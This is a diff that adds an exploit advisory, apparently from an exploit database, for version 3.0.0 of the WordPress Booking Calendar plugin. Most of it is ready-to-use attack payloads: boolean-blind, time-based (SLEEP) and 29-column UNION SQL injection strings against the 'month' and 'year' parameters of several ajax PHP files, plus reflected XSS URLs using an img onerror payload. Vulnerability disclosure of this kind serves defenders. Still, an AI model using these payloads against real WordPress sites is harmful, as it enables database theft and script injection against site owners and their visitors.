@@ -1,0 +1,53 @@
+# Exploit Title: Wordpress Plugin Booking Calendar 3.0.0 - SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 26.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor: Wachipi
+# Vendor Homepage: https://codecanyon.net/item/wp-booking-calendar/4639530
+# Version: 3.0.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : An attacker can perform attacks via calendar ajax queries.
+However, this plugin is fully PHP-enabled. You can run SQL query with "month" and "year" parameters.
+These parameters are also suitable for XSS attacks.
+All PHP queries for which these parameters work have the same vulnerable.
+
+====================================================
+# "fillEventsPopup.php, searchEvents.php, getEvent.php, getMonthCalendar.php" have the same vulnerable.
+
+# PoC : SQLi :
+# GET /BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php?month=4&year=2018&calendar_id=1&publickey=6LcDyOASAAAAACsEVY6G4Yo1BqxCGW15S15mb36-%20&wpml_lang=
+
+# Parameter: month (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: year=2018&month=5' AND 7958=7958 AND 'FXnO'='FXnO&calendar_id=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: year=2018&month=5' AND SLEEP(5) AND 'MmZz'='MmZz&calendar_id=1
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 29 columns
+    Payload: year=2018&month=5' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a7171,0x424e507748695862436e774c4a4d664a7751424c537678554656465a464b7074685051527676756e,0x7178707071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&calendar_id=1
+
+Parameter: year (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: year=-8454' OR 7997=7997#&month=5&calendar_id=14&pag=1
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: year=2018' AND SLEEP(5)-- uTJs&month=5&calendar_id=14&pag=1
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 29 columns
+    Payload: year=2018' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71786a7171,0x7766694a50504a425a6e635a564b5172674c745770414e4f46494977475a44626b416a6c797a674b,0x7178707071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&month=5&calendar_id=1
+
+====================================================
+
+# PoC : XSS :
+
+Payload(year) : http://www.site.com/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php?month=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E&year=2018&calendar_id=1&publickey=6LcDyOASAAAAACsEVY6G4Yo1BqxCGW15S15mb36-%20&wpml_lang=
+
+Payload(month) : http://www.site.com/BOOKING_WP/wp-content/plugins/wp-booking-calendar/public/ajax/getMonthCalendar.php?month=4&year=%3E%27%3E%22%3E%3Cimg%20src=x%20onerror=alert%280%29%3E&calendar_id=1&publickey=6LcDyOASAAAAACsEVY6G4Yo1BqxCGW15S15mb36-%20&wpml_lang=
